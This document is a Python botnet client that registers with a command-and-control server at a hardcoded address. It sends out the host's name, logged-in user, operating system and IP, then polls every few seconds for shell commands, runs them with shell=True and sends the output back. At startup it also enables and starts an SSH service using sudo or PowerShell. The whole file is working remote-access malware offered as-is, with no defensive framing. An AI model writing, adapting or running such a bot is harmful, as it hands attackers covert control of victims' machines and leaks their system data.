import requests
import time
import subprocess
import os
import platform
import socket

# ✅ Set your C2 Server URL
C2_URL = "http://192.168.0.127:5001"  # Change this if needed

# ✅ Function to get the local IP address dynamically
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

# ✅ Function to register the bot with the C2 server
def register_bot():
    bot_data = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system() + " " + platform.release(),
        "ip": get_local_ip()
    }

    print(f"🔵 Sending bot data: {bot_data}")  # Debugging

    try:
        response = requests.post(f"{C2_URL}/register", json=bot_data, headers={"Content-Type": "application/json"})
        print(f"🔴 Server Response: {response.status_code} - {response.text}")

        if response.status_code == 200:
            try:
                bot_id = response.json().get("bot_id", None)
                if bot_id:
                    print(f"✅ Bot successfully registered with ID: {bot_id}")
                    return bot_id
                else:
                    print("❌ Error: Invalid response format, 'bot_id' missing.")
                    return None
            except requests.exceptions.JSONDecodeError:
                print("❌ Error: Failed to parse JSON response.")
                return None
        else:
            print("❌ Failed to register bot. Check server logs.")
            return None

    except requests.exceptions.RequestException as e:
        print(f"❌ Error: Could not reach C2 server. {e}")
        return None

# ✅ Function to send command execution result back to the C2 server
def send_result(bot_id, output):
    try:
        payload = {
            "bot_id": bot_id,
            "output": output
        }
        response = requests.post(f"{C2_URL}/command_result", json=payload, headers={"Content-Type": "application/json"})
        if response.status_code == 200:
            print(f"🔵 Successfully sent command result: {response.status_code}")
        else:
            print(f"⚠️ Warning: Server responded with {response.status_code} - {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"❌ Error sending result to C2: {e}")

# ✅ Function to fetch and execute commands from the C2 server
def bot_instance(bot_id):
    while True:
        try:
            if bot_id is None:
                print("❌ Bot ID is None, attempting re-registration...")
                bot_id = register_bot()
                if bot_id is None:
                    print("⚠️ Retrying in 10 seconds...")
                    time.sleep(10)
                    continue

            # Fetch command from C2 server
            command_response = requests.get(f"{C2_URL}/command/{bot_id}")
            command = command_response.text.strip()

            if command.lower() != "no command":
                print(f"⚡ Executing Command: {command}")
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout.strip() if result.stdout else result.stderr.strip()
                print(f"[Bot {bot_id}] Output: {output}")

                # ✅ Send result back to the C2 server
                send_result(bot_id, output)

            time.sleep(5)  # Check for new commands every 5 seconds

        except Exception as e:
            print(f"⚠️ Error checking for commands: {e}")
            time.sleep(10)

# ✅ Function to enable SSH access (Only if not already running)
def enable_ssh():
    if platform.system() in ["Linux", "Darwin"]:  # Linux & macOS
        ssh_status = subprocess.run(["systemctl", "is-active", "ssh"], capture_output=True, text=True)
        if ssh_status.returncode != 0:  # If SSH is not active
            subprocess.run(["sudo", "systemctl", "start", "ssh"], check=False)
            subprocess.run(["sudo", "systemctl", "enable", "ssh"], check=False)
            print("[*] SSH Access Enabled")
        else:
            print("[*] SSH is already running.")

    elif platform.system() == "Windows":  # Windows
        subprocess.run(["powershell", "-Command", "Start-Service sshd"], check=False)
        subprocess.run(["powershell", "-Command", "Set-Service -Name sshd -StartupType Automatic"], check=False)
        print("[*] SSH Access Enabled")

if __name__ == "__main__":
    # ✅ Enable SSH on startup
    enable_ssh()

    # ✅ Register bot and get bot ID
    bot_id = register_bot()

    # ✅ Start bot instance
    bot_instance(bot_id)
